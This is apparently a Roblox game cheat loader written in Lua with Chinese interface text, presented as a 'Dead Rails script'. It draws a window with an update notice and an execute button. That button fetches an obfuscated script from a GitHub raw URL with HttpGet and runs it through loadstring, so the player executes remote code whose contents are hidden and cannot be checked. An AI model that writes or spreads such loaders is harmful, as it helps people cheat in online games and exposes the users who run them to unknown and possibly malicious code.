local Player = game:GetService("Players").LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

-- 创建GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SiTieGui"
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- 主窗口
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
MainFrame.BackgroundTransparency = 0.1
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
MainFrame.Size = UDim2.new(0, 300, 0, 350)
MainFrame.Active = true
MainFrame.Draggable = true

-- 圆角
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.ZIndex = 2

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = TitleBar

local TitleText = Instance.new("TextLabel")
TitleText.Name = "TitleText"
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Position = UDim2.new(0, 15, 0, 0)
TitleText.Size = UDim2.new(0, 200, 1, 0)
TitleText.Font = Enum.Font.SourceSansBold
TitleText.Text = "死铁轨脚本 v1.0"
TitleText.TextColor3 = Color3.fromRGB(255, 100, 100)
TitleText.TextSize = 18
TitleText.TextXAlignment = Enum.TextXAlignment.Left

-- 关闭按钮
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Parent = TitleBar
CloseButton.BackgroundTransparency = 1
CloseButton.Position = UDim2.new(0.9, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 40, 1, 0)
CloseButton.Font = Enum.Font.SourceSansBold
CloseButton.Text = "✕"
CloseButton.TextColor3 = Color3.fromRGB(255, 100, 100)
CloseButton.TextSize = 20

-- 更新公告区域
local NewsFrame = Instance.new("Frame")
NewsFrame.Name = "NewsFrame"
NewsFrame.Parent = MainFrame
NewsFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
NewsFrame.BorderSizePixel = 0
NewsFrame.Position = UDim2.new(0, 10, 0, 50)
NewsFrame.Size = UDim2.new(1, -20, 0, 150)

local NewsCorner = Instance.new("UICorner")
NewsCorner.CornerRadius = UDim.new(0, 8)
NewsCorner.Parent = NewsFrame

local NewsTitle = Instance.new("TextLabel")
NewsTitle.Name = "NewsTitle"
NewsTitle.Parent = NewsFrame
NewsTitle.BackgroundTransparency = 1
NewsTitle.Position = UDim2.new(0, 10, 0, 5)
NewsTitle.Size = UDim2.new(1, -20, 0, 25)
NewsTitle.Font = Enum.Font.SourceSansBold
NewsTitle.Text = "📢 更新公告"
NewsTitle.TextColor3 = Color3.fromRGB(255, 100, 100)
NewsTitle.TextSize = 16
NewsTitle.TextXAlignment = Enum.TextXAlignment.Left

local NewsContent = Instance.new("TextLabel")
NewsContent.Name = "NewsContent"
NewsContent.Parent = NewsFrame
NewsContent.BackgroundTransparency = 1
NewsContent.Position = UDim2.new(0, 10, 0, 30)
NewsContent.Size = UDim2.new(1, -20, 1, -40)
NewsContent.Font = Enum.Font.SourceSans
NewsContent.Text = [[• 新增自动收集功能
• 修复已知Bug
• 优化脚本性能
• 添加更多游戏支持
• 改进用户界面]]
NewsContent.TextColor3 = Color3.fromRGB(220, 220, 220)
NewsContent.TextSize = 14
NewsContent.TextWrapped = true
NewsContent.TextXAlignment = Enum.TextXAlignment.Left
NewsContent.TextYAlignment = Enum.TextYAlignment.Top

-- 脚本功能按钮
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Name = "ExecuteButton"
ExecuteButton.Parent = MainFrame
ExecuteButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
ExecuteButton.BorderSizePixel = 0
ExecuteButton.Position = UDim2.new(0.1, 0, 0.65, 0)
ExecuteButton.Size = UDim2.new(0.8, 0, 0, 40)
ExecuteButton.Font = Enum.Font.SourceSansBold
ExecuteButton.Text = "执行脚本"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.TextSize = 16

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = ExecuteButton

-- 状态显示
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Name = "StatusLabel"
StatusLabel.Parent = MainFrame
StatusLabel.BackgroundTransparency = 1
StatusLabel.Position = UDim2.new(0, 10, 0, 280)
StatusLabel.Size = UDim2.new(1, -20, 0, 20)
StatusLabel.Font = Enum.Font.SourceSans
StatusLabel.Text = "状态: 准备就绪"
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
StatusLabel.TextSize = 14
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left

-- 底部信息
local InfoLabel = Instance.new("TextLabel")
InfoLabel.Name = "InfoLabel"
InfoLabel.Parent = MainFrame
InfoLabel.BackgroundTransparency = 1
InfoLabel.Position = UDim2.new(0, 10, 0, 320)
InfoLabel.Size = UDim2.new(1, -20, 0, 20)
InfoLabel.Font = Enum.Font.SourceSans
InfoLabel.Text = "死铁轨脚本 © 2024"
InfoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
InfoLabel.TextSize = 12
InfoLabel.TextXAlignment = Enum.TextXAlignment.Center

-- 功能函数
CloseButton.MouseButton1Click:Connect(function()
    TweenService:Create(MainFrame, TweenInfo.new(0.3), {
        Size = UDim2.new(0, 0, 0, 350),
        Position = UDim2.new(0.3, 150, 0.3, 0)
    }):Play()
    wait(0.3)
    ScreenGui:Destroy()
end)

ExecuteButton.MouseButton1Click:Connect(function()
    ExecuteButton.Text = "执行中..."
    ExecuteButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    StatusLabel.Text = "状态: 正在执行..."
    StatusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
    
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/jsusg750/-/refs/heads/main/obf_Elqe1b1whjcWm216A5Qx043EGc7om3jFqgO747vFakyR6tTy44a2830PZyyf6g7L.lua.txt"))()
    end)
    
    if success then
        ExecuteButton.Text = "执行成功"
        ExecuteButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
        StatusLabel.Text = "状态: 执行成功！"
        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
    else
        ExecuteButton.Text = "执行失败"
        ExecuteButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        StatusLabel.Text = "状态: 执行失败"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        warn("脚本加载错误: "..tostring(err))
    end
end)

-- 按钮悬停效果
ExecuteButton.MouseEnter:Connect(function()
    TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(255, 120, 120)
    }):Play()
end)

ExecuteButton.MouseLeave:Connect(function()
    if ExecuteButton.Text == "执行脚本" then
        TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        }):Play()
    end
end)

CloseButton.MouseEnter:Connect(function()
    TweenService:Create(CloseButton, TweenInfo.new(0.2), {
        TextColor3 = Color3.fromRGB(255, 150, 150)
    }):Play()
end)

CloseButton.MouseLeave:Connect(function()
    TweenService:Create(CloseButton, TweenInfo.new(0.2), {
        TextColor3 = Color3.fromRGB(255, 100, 100)
    }):Play()
end)
